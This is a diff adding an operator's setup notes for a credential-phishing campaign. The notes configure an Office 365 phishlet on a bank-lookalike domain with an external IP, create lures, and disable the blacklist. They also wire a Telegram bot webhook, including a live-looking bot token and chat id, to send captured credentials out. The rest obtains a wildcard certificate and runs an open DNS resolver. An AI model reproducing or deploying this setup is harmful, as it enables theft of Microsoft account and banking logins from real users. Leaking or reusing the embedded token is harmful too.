@@ -1,0 +1,46 @@
+phishlets disable o365
+
+config domain easybanqingonline.online
+
+phishlets hostname o365 easybanqingonline.online
+config ipv4 external 206.189.58.3
+phishlets enable o365
+blacklist off
+lures create o365
+
+curl -s "https://api.telegram.org/bot7660886603:AAHc_palC1WCHWgtPWau6w4VHnW2OwdEOU0/getUpdates" | grep -o '"chat":{"id":-[0-9]\+.*,"type":"[^"]*"' | grep -o '"id":-[0-9]\+.*' | cut -d':' -f2 | cut -d',' -f1
+config webhook_telegram 7660886603:AAHc_palC1WCHWgtPWau6w4VHnW2OwdEOU0/-4625337222
+
+certbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.easybanqingonline.online --email noreply@live.com
+
+ot@xel:~# sudo unbound-checkconf /etc/unbound/unbound.conf
+/etc/unbound/unbound.conf:23: error: unknown keyword 'do-tls'
+/etc/unbound/unbound.conf:23: error: stray ':'
+/etc/unbound/unbound.conf:23: error: unknown keyword 'yes'
+read /etc/unbound/unbound.conf failed: 3 errors in configuration file
+root@xel:~#
+
+
+include-toplevel: "/etc/unbound/unbound.conf.d/*.conf"
+server:
+    interface: 0.0.0.0@53
+    interface: 0.0.0.0@853
+    port: 53
+    do-ip4: yes
+    do-ip6: no
+    do-udp: yes
+    do-tcp: yes
+    access-control: 0.0.0.0/0 allow
+    verbosity: 2
+    logfile: ""
+    use-syslog: yes
+    tls-cert-bundle: "/etc/ssl/certs/ca-certificates.crt"
+    tls-service-key: "/etc/letsencrypt/live/login.easybanqingonline.online/privkey.pem"
+    tls-service-pem: "/etc/letsencrypt/live/login.easybanqingonline.online/fullchain.pem"
+    tls-port: 853
+
+sudo unbound-checkconf /etc/unbound/unbound.conf
+
+sudo systemctl stop unbound
+sudo systemctl start unbound
+sudo systemctl status unbound
